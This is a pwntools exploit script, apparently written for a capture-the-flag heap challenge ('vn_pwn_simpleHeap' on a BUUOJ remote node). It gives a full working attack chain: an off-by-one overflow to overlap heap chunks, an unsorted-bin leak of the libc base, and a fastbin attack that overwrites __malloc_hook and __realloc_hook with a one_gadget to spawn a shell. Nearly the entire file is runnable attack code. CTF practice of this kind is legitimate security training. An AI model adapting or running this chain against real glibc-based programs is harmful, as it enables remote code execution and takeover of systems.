# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    vuln: off-by-one in sub_C39 through Edit
    
exp: fastbin dup to leak libc and hijack __realloc_hook and __malloc_hook
1.off-by-one to modify next_chunk size larger to make chunks overlapping
2.unsortedbin attack to leak libc by modifying next_chunk size to 0xA1 (overlapping chunk)
3.fastbin attack to hijack __realloc_hook to one_gadget by modifying next_chunk fd to (&__malloc_hook - 0x23) the fake_chunk in libc
4.hijack __malloc_hook to libc.realloc + 13 (or 16 also works) to trigger __realloc_hook when call malloc
5.Add new chunk to trigger one_gadget
'''
from pwn import *


# define the context
binary_name = './vn_pwn_simpleHeap'
libc_name = './ubuntu16-libc-2.23-x64.so' if args.REMOTE \
    else '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 29903)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        # Add
        # brva 0x0000000000000F81
        # Show
        # brva 0x0000000000000F99 
        # Del
        # brva 0x0000000000000DF7 
        # Edit
        brva 0x0000000000000CBB
        c
    """, aslr=False)
else:
    io = process(binary_name)


# exploiting code
def Add(sz, content):
    sla(b'choice: ', b'1')
    sla(b'size?', str(sz).encode())
    sa(b'content:', content)

def Edit(idx, content):
    sla(b'choice: ', b'2')
    sla(b'idx?', str(idx).encode())
    sa(b'content:', content)

def Show(idx):
    sla(b'choice: ', b'3')
    sla(b'idx?', str(idx).encode())

def Del(idx):
    sla(b'choice: ', b'4')
    sla(b'idx?', str(idx).encode())


Add(0x18, b'fa1c4') # chunk_0
Add(0x60, b'F' * 8) # chunk_1: off-by-one to overlap with chunk_2
Add(0x68, b'F' * 0x60 + p64(0xE1)) # chunk_2: delta_chunk_1 next_chunk prev_size == 0xA1 
                                   # to pass checking next_chunk->prev_size == cur_chunk->size
Add(0x18, b'/bin/sh\x00') # chunk_3
Add(0x18, b'fa1c4') # chunk_4

Edit(0, b'F' * 0x18 + b'\xE1') # align with 2 * SIZE_SZ
Del(1) # chunk_1 will be put into unsortedbin

Add(0x60, b'F' * 0x60) # chunk_1 unsortebin attack to leak libc
Add(0x68, b'F' * 8) # chunk_2 | chunk_5
Show(2) # leak main_arena (libc)

ru(b'F' * 0x8)
main_arena_addr = u64(rc(6).ljust(8, b'\x00')) - 88

main_arena_offset = 0x3c4b20 if args.REMOTE else 0x3c4b20
libc.address = main_arena_addr - main_arena_offset
log.info(f'libc.address: {hex(libc.address)}')

# fastbin attack to hijack __malloc_hook
# free_hook_addr = libc.sym['__free_hook']
# system_addr = libc.sym['system']
malloc_hook_addr = libc.sym['__malloc_hook']
realloc_addr = libc.sym['__libc_realloc']
fake_chunk_addr = malloc_hook_addr - 0x23
log.info(f'realloc: {hex(realloc_addr)}')
log.info(f'__malloc_hook: {hex(malloc_hook_addr)}')
log.info(f'fake_chunk: {hex(fake_chunk_addr)}')

# remote one_gadget: 0x45216 0x4526a 0xf02a4 0xf1147
# local one_gadget: 0x4527a 0xf03a4 0xf1247
one_gadget_addr = libc.address
one_gadget_addr += 0x4526a if args.REMOTE else 0x4527a
log.info(f'one_gadget: {hex(one_gadget_addr)}')

Del(5) # chunk_5 overlaps with chunk_2 | UAF
Edit(2, p64(fake_chunk_addr) + b'\x0A') # chunk_2->next_chunk = fake_chunk
Add(0x68, b'F' * 8) # chunk_5

# realloc_addr + 13(16 also works) to pass constraint and call realloc_hook to trigger one_gadget 
payload = b'F' * (0x13 - 0x8) + p64(one_gadget_addr) + p64(realloc_addr + 16)
Add(0x68, payload) # chunk_6 | fake_chunk

# Add(0x48, p64(system_addr)) # chunk_6 | size check in fastbin failed 
# Del(3) # trigger system('/bin/sh')

sla(b'choice: ', b'1')
sla(b'size?', str(6).encode())

# interact with the shell
io.interactive()
